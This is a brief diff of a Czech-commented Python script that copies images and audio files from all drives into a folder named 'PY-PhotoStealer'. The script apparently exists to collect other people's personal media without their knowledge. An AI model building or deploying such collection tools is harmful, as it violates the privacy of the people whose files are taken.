@@ -2,7 +2,7 @@ import os
 import shutil
 
 # Adresář na SD kartě, kam chcete kopírovat soubory
-destination_directory = "/mnt/sdcard"
+destination_directory = "E:/PY-PhotoStealer/photos/"
 
 # Seznam přípon souborů, které chcete kopírovat
 file_extensions = [".jpg", ".png", ".jpeg", ".wav", ".mp3"]
@@ -26,3 +26,4 @@ for drive in drives:
         process_directory(drive)
 
 print("Kopírování souborů dokončeno.")
+
